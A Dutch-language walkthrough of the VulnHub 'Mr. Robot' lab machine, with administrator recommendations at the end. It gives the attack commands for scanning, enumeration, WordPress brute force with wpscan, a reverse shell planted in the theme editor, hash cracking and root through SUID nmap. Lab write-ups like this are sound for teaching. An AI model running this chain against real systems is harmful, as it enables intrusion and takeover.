# VulnHub - Mr. Robot Write-up

**Auteur:** Jouw Naam  
**Datum:** 2024  
**Platform:** VulnHub  
**Moeilijkheid:** Medium  
**OS:** Linux  
**Alle flags gevonden:** 3/3

---

## Samenvatting

Mr. Robot is een VulnHub machine gebaseerd op de gelijknamige TV serie. De machine bevat een kwetsbare WordPress installatie en vereist kennis van web enumeration, brute force aanvallen en Linux privilege escalation via SUID binaries.

---

## Reconnaissance

### Netwerk scan

```bash
netdiscover -r 192.168.1.0/24
nmap -sV -sC -p- 192.168.1.X
```

### Nmap resultaten

```
22/tcp  closed ssh
80/tcp  open   http    Apache
443/tcp open   https   Apache
```

### Bevindingen
- SSH poort gesloten
- Webserver actief op poort 80 en 443
- Apache webserver gedetecteerd

---

## Web Enumeration

### Gobuster directory scan

```bash
gobuster dir -u http://192.168.1.X -w /usr/share/wordlists/dirb/common.txt
```

### Gevonden directories
- `/robots.txt` - Bevat eerste flag en wordlist
- `/wp-login.php` - WordPress login pagina
- `/wp-admin` - WordPress admin panel
- `/readme.html` - WordPress versie informatie

### robots.txt analyse

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

**Flag 1 gevonden via robots.txt!**

### WPScan - WordPress analyse

```bash
wpscan --url http://192.168.1.X --enumerate u
```

### Resultaten
- WordPress versie gedetecteerd
- Gebruikersnaam gevonden: `elliot`

---

## Exploitation

### Brute force WordPress login

```bash
wpscan --url http://192.168.1.X \
       --username elliot \
       --passwords fsocity.dic
```

### Resultaat
- Wachtwoord succesvol gekraakt
- Ingelogd op WordPress admin panel

### Reverse shell uploaden

```bash
# PHP reverse shell aangemaakt via:
# Appearance > Editor > 404.php

# Netcat listener gestart:
nc -lvnp 4444

# Shell getriggerd via browser:
http://192.168.1.X/?p=404
```

### Shell verkregen
```
daemon@linux:/$ whoami
daemon
```

---

## Privilege Escalation

### Stap 1 - Van daemon naar robot

```bash
# Wachtwoord hash gevonden in /home/robot/
cat /home/robot/password.raw-md5

# Hash gekraakt via John the Ripper:
john hash.txt --wordlist=fsocity.dic

# Ingelogd als robot:
su robot
```

**Flag 2 gevonden in /home/robot/**

### Stap 2 - Van robot naar root

```bash
# SUID binaries zoeken:
find / -perm -4000 2>/dev/null

# Nmap SUID gevonden!
# Nmap interactive mode gebruiken:
nmap --interactive
!sh

# Root shell verkregen:
whoami
root
```

**Flag 3 gevonden in /root/**

---

## Flags Overzicht

| Flag | Locatie | Methode |
|------|---------|---------|
| Flag 1 | /robots.txt | Web enumeration |
| Flag 2 | /home/robot/ | Hash cracking |
| Flag 3 | /root/ | SUID nmap exploit |

---

## Tools Gebruikt

| Tool | Doel |
|------|------|
| Nmap | Netwerk en poort scanning |
| Gobuster | Web directory enumeration |
| WPScan | WordPress vulnerability scanning |
| Netcat | Reverse shell listener |
| John the Ripper | Password hash cracking |
| find | SUID binary zoeken |

---

## Lessons Learned

1. `robots.txt` kan gevoelige informatie bevatten
2. WordPress brute force is effectief zonder lockout beleid
3. SUID binaries zijn gevaarlijk als ze verkeerd geconfigureerd zijn
4. Altijd `/home` mappen checken voor gevoelige bestanden
5. Hash cracking met doelgerichte wordlists is effectief

---

## Aanbevelingen

```
Voor systeembeheerders:
→ robots.txt mag geen gevoelige bestanden bevatten
→ WordPress login brute force beveiliging inschakelen
→ Sterke wachtwoorden gebruiken
→ SUID rechten minimaliseren
→ Regelmatige security audits uitvoeren
```

---

## Referenties

- VulnHub Mr. Robot: https://www.vulnhub.com/entry/mr-robot-1,151/
- GTFOBins nmap: https://gtfobins.github.io/gtfobins/nmap/
- WPScan documentatie: https://wpscan.com

---

*Dit write-up is gemaakt voor educatieve doeleinden in een gecontroleerde lab omgeving.*
